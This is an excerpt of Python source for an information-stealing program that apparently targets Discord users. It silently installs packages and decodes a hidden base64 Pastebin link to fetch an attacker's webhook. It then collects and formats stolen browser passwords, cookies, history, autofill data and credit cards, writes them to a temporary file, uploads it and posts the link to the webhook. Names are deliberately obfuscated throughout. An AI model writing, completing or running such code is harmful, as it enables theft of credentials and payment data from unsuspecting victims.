...
subprocess.check_call(['pip', 'install', 'requests', 'pycryptodome'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

from Crypto.Cipher import AES
        

def get_h00k():
    bit64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L053NndYY0FU"                      #base64 PASTEBIN with WebHook
    bit = base64.b64decode(bit64.encode()).decode('utf-8')
    try:
        response = requests.get(bit)
        if response.status_code == 200:
            h00k = response.text.strip()
            return h00k
        else:
            return None
...
def G3784D63(flags):
    ...
    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': ''},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': ""},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': ""},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': ""},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': ""},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': ""},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': ""},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': ""},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': ""},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': ""},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': ""}
    ]
        ...
        "embeds": [
            {
                ...
                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n • **{P455WC0UNt}** Passwords Found\n • [{cname}Passwords.txt]({filess[0]})"
            },
            {
                "title": f"{cname} | Cookies {words}",
                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n • **{C00K1C0UNt}** Cookies Found\n • [{cname}Cookies.txt]({filess[1]})"
            },
            {
                "title": f"{cname} | Browser Data",
                "description": f" • **{H1570rYC0UNt}** Histories Found\n • [{cname}Histories.txt]({filess[4]})\n\n • **{AU70F111C0UNt}** Autofills Found\n • [{cname}Autofills.txt]({filess[3]})\n\n • **{CC5C0UNt}** Credit Cards Found\n • [{cname}CreditCards.txt]({filess[2]})\n\n • **{B00KM4rK5C0UNt}** Bookmarks Found\n • [{cname}Bookmarks.txt]({filess[5]})"
            }
        ]
    }
    return
...
data_list = [str(data1), str(data2), str(data3), str(data4), str(data5)]
combined_data = '\n---------------------\n'.join(data_list)

import tempfile

def write_variable_to_temp_file(variable):
    with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', delete=False) as temp_file:
        formatted_variable = str(variable).replace('\n', '\n').replace(',', ', ')
        temp_file.write(formatted_variable)

    return temp_file.name

file_path = write_variable_to_temp_file(combined_data)
download = UP104D7060F113(file_path)

global main_file
main_file = download

def senwbu(webhook_url, message, user=os.getlogin()):
    payload = {        "content": f'||@everyone||**New message from ```{user}```** {message}'}
    response = requests.post(webhook_url, json=payload)
    return response

senwbu(h00k, download)